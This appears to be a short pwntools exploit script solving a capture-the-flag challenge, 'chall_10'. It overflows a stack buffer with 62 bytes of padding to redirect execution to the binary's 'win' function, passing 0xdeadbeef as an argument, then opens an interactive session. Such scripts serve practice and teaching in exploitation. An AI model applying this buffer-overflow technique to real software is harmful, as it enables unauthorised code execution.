# coding: utf-8
from pwn import *
elf=ELF("./chall_10")
0x3a
payload = b'a'*62+p32(elf.sym.win)+b'a'*4+p32(0xdeadbeef)
p=process("./chall_10")
p.sendline(b'foobar')
p.sendline(payload)
p.interactive()
